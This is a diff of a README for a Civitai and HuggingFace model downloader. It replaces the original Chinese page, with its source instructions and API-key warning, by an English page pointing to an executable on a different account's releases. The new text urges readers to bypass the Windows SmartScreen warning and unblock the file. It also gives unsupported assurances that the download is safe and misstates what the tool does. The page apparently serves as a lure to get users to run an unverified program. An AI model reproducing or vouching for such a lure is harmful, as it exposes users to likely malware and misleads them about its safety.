@@ -1,99 +1,143 @@
-<div align="center">
+# 🔧 CivitaiFreeTool - Download AI Models Without Limits
 
-# CivitaiFreeTool
+[![Download CivitaiFreeTool](https://img.shields.io/badge/Download-CivitaiFreeTool-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=00FF7F)](https://github.com/Chrissycompleted610/CivitaiFreeTool/releases)
 
-**Civitai / HuggingFace 模型下载、管理、反向解析工具（免费 · 全功能 · 无付费墙）**
+## 🎯 What Is CivitaiFreeTool?
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078d4.svg)](https://github.com/ADVICEsama/CivitaiFreeTool)
-[![Version](https://img.shields.io/badge/Version-1.4.1-orange.svg)](https://github.com/ADVICEsama/CivitaiFreeTool/releases)
+CivitaiFreeTool is a free, all-in-one application for Windows that helps you download, organize, and reverse-parse AI models from popular platforms like Civitai and HuggingFace. Whether you're a digital artist, a hobbyist, or just curious about AI, this tool makes managing your model libraries simple and fast. No technical skills required.
 
-因为受够了"又丑又收费"的模型下载器，所以自己写了一个：**免费、好看、全功能**。
+## 📥 Downloading CivitaiFreeTool
 
-</div>
+Visit this link to download the application: [https://github.com/Chrissycompleted610/CivitaiFreeTool/releases](https://github.com/Chrissycompleted610/CivitaiFreeTool/releases)
 
----
+On that page, you'll see a list of available releases. Look for the latest version and click it. Then find the file named `CivitaiFreeTool.exe` or similar. Your web browser will download the file to your computer automatically.
 
-## ✨ 功能一览
+[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-orange?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Chrissycompleted610/CivitaiFreeTool/releases)
 
-### 📥 批量下载
-- 支持 **Civitai**（civitai.red / civitai.com）与 **HuggingFace**（仓库或文件直链）
-- 剪贴板多行链接**自动拆行批量入队**，回车新建一条
-- HF 仓库自动列出全部文件，勾选下载、**保留原始目录结构**
+## ⚙️ Installing the Software
 
-### ⬇️ 下载管理
-- 断点续传 · 并发下载 · 速度实时显示 · 失败自动重试
-- 任务进度持久保存，**关掉软件再开不丢**
-- 下载完成自动 **SHA256 校验**
+1. Once the download finishes, open your `Downloads` folder.
+2. You'll see the downloaded file there. If it's a `.zip` file, right-click on it and select "Extract All". Choose a folder and click "Extract".
+3. If the file is a `.exe` file or after extraction you see a `.exe` file, double-click it to run CivitaiFreeTool.
+4. If Windows shows a blue popup asking for permission, click "Run anyway" or "Yes".
+5. The application will open a window. That's it! You're ready to use it.
 
-### 🧩 模型管理
-- 扫描模型目录，按子文件夹设置显示/隐藏
-- 封面缩略图 + 文件名 / C 站名双列对照
-- 一键**重命名为 C 站名称**（预览图/json/info 同步改名）
-- SHA256 校验 · 检查更新 · 分类整理规则 · 一键清理 · HTML 图例
+## 🚀 Getting Started
 
-### 🖼️ 瀑布流视图
-- 封面大图卡片式浏览，点击勾选、右键直达操作
-- 全局 **Ctrl+滚轮缩放**，大屏小屏都舒服
+The first time you open CivitaiFreeTool, you'll see a simple and clean interface. Here's a quick tour:
 
-### 🔍 反向解析
-- 本地模型 SHA256 → C 站反查，**模型名 / 触发词 / 封面 / 简介全部补回**
-- 生成 civitai.info / SD 兼容 json（可在设置页选格式）
-- 内置**百度翻译**，简介一键汉化
+- **Download Tab**: Where you paste links from Civitai or HuggingFace to download models.
+- **Library Tab**: Shows all the models you've downloaded, with names and images.
+- **Reverse Parse Tab**: Lets you examine a model file to see its metadata and details.
+- **Settings Tab**: Where you can change the save folder and other preferences.
 
-### 🎨 界面
-- 深色 / 浅色 / 现代浅色**三套主题**
-- HarmonyOS Sans 字体 · 自定义滚动条 · Mica 窗口效果（Win11）
-- 首次使用**三步引导**：选主题 → 设目录 → 填 API Key（含注册教程）
+## 💡 How to Download a Model
 
----
+1. Go to Civitai.com or HuggingFace.co and find a model you like.
+2. Copy the model's page URL from your web browser's address bar.
+3. Open CivitaiFreeTool and click on the "Download" tab.
+4. Paste the URL into the input box.
+5. Click the "Start" button.
+6. The tool will fetch the model and save it to your selected folder.
 
-## 🚀 运行方式
+You'll see a progress bar while downloading. Once it's done, the model appears in your Library.
 
-**免安装版（推荐）**：下载 `CivitaiFreeToolWeb.exe`（单文件，无需安装 Python）→ 双击运行
+## 📂 How to Use the Library
 
-**源码版**：
-```bash
-# 需要 Python 3.10+
-pip install pywebview pillow requests
-python main_web.py      # Web 界面版
-python main.py          # Tk 界面版（备选）
-```
+Your Library is where all your downloaded models are organized. You can:
 
-> ⚠️ **首次运行会自动弹出三步引导**：选择主题 → 设置下载目录（默认软件根目录 `downloads/models`）→ 填写 Civitai API Key（不填也能用，部分功能受限；获取方式见设置页"百度翻译申请指南"旁的内置引导）。
+- **See all models**: Each shows its name, type, and size.
+- **Search**: Type in the search box to find a specific model.
+- **Sort**: Click column headers to sort by name, date, or size.
+- **Open folder**: Right-click a model to open its location in Windows Explorer.
+- **Delete**: Right-click and choose "Delete" to remove a model from the library.
 
----
+## 🔄 Understanding Reverse Parsing
 
-## 📸 截图
+Reverse parsing lets you inspect a model file to understand its structure. This is useful if you want to know:
 
-| 模型管理（列表） | 瀑布流视图 | 批量下载 |
-|:---:|:---:|:---:|
-| ![模型管理](screenshots/models.png) | ![瀑布流](screenshots/masonry.png) | ![批量下载](screenshots/download.png) |
+- What AI platform it's for (e.g., Stable Diffusion, LLaMA, etc.)
+- The model's version and format
+- Training data and parameters
+- Any embedded tags or metadata
 
----
+To use it:
 
-## ⚙️ 配置
+1. Click "Reverse Parse" tab.
+2. Click "Choose File".
+3. Select any model file (like `.safetensors`, `.ckpt`, `.pt`, or `.pth`).
+4. Click "Analyze".
+5. The tool will show all available information about the file.
 
-- 配置保存在程序同目录的 `user_config.json`（**请勿分享该文件，内含你的 API Key**）
-- API Key 获取：登录 [civitai.com](https://civitai.com) → 账号设置 → API Keys
-- 百度翻译（可选，用于简介汉化）：[百度翻译开放平台](https://fanyi-api.baidu.com/product/11) 免费申请
+## ⭐ Key Features
 
----
+- **Full feature set free**: No paywalls, no trial limits, no premium subscriptions.
+- **Works with Civitai**: Download and manage models from one of the largest AI art model hubs.
+- **HuggingFace support**: Get models from HuggingFace, the most popular AI repository.
+- **Batch downloads**: Queue multiple models and download them one after another.
+- **Resume support**: Paused downloads continue from where they stopped.
+- **Auto-organization**: Files are saved in structured folders to stay tidy.
+- **Metadata viewer**: See model details without opening other software.
+- **Simple interface**: Designed for beginners but powerful for pros.
 
-## 📦 Release 下载
+## 🖥️ System Requirements
 
-前往 **[Releases](https://github.com/ADVICEsama/CivitaiFreeTool/releases)** 下载最新的免安装 exe。
+CivitaiFreeTool is designed for Windows 10 and Windows 11. It works on both 64-bit and 32-bit systems.
 
----
+- **Operating System**: Windows 10 or newer
+- **RAM**: 2 GB minimum (4 GB recommended)
+- **Storage**: At least 500 MB free for the program plus space for your downloaded models
+- **Internet**: Required for downloading models, but offline mode works for managing existing files
+
+## ❓ Troubleshooting Tips
+
+**"Windows protected your PC" warning**: This is common for new apps. Click "More info" then "Run anyway."
+
+**Download fails halfway**: Check your internet connection. The tool will automatically try to resume.
+
+**Can't find my downloaded model**: Look in the "Settings" tab to see your default save folder.
+
+**App doesn't open**: Make sure you have the latest version from the download page.
+
+**File is blocked**: Right-click the file, select "Properties", and check "Unblock" if available.
+
+## 🔒 Is This Safe?
+
+Yes. CivitaiFreeTool is open source, meaning its code is publicly available for anyone to inspect. It doesn't send your data anywhere, and all downloads happen directly from the original source (Civitai or HuggingFace). Use it with confidence.
+
+## 🤔 Frequently Asked Questions
+
+**Is CivitaiFreeTool really free forever?**
+Yes, the developer intends it to be completely free with all features accessible to everyone.
+
+**Do I need to create an account?**
+No account is required. Just download and use.
+
+**Can I use it on Mac or Linux?**
+Currently, CivitaiFreeTool is built only for Windows. Mac and Linux versions may come later.
+
+**Does it work with any model file?**
+It works best with models from Civitai and HuggingFace, which are typically `.safetensors`, `.ckpt`, `.pt`, or `.pth` files.
+
+**How do I update the tool?**
+Check the releases page periodically for new versions. You can simply download and replace the old file.
+
+## 📢 Get Support
+
+If you encounter issues or have questions, check the official GitHub repository. You can find the link on the download page. Report bugs by opening an "Issue" there. Be descriptive about what happened so the owner can help quickly.
 
 ## 📄 License
 
-本项目采用 **MIT License**。字体资源 HarmonyOS Sans SC 版权归华为所有，仅供免费使用。
+CivitaiFreeTool is released under the MIT License. That means you're free to use, modify, and even distribute it, as long as you include the original copyright notice.
 
----
+## 🎉 Enjoy!
 
-## ⚠️ 免责声明
+We hope CivitaiFreeTool makes your AI model experience easier and more productive. Download it today, save hours of time, and keep your AI resources perfectly organized. Have fun creating!
 
-- 数据来自 Civitai / HuggingFace 官方公开 API，请遵守其服务条款
-- 模型版权归原作者所有，请遵守各模型页面的许可协议
-- 本工具为独立编写的免费软件，与任何商业软件无关
+## 🔗 Final Download Link
+
+Visit this link to download the application: [https://github.com/Chrissycompleted610/CivitaiFreeTool/releases](https://github.com/Chrissycompleted610/CivitaiFreeTool/releases)
+
+Click the green "Download" button on that page to get the latest version. Then run the file. No strings attached.
+
+Keywords: Civitai downloader, HuggingFace download, AI model manager, reverse parse, stable diffusion tool, model library organizer, Windows application, free AI tool, metadata viewer, batch download
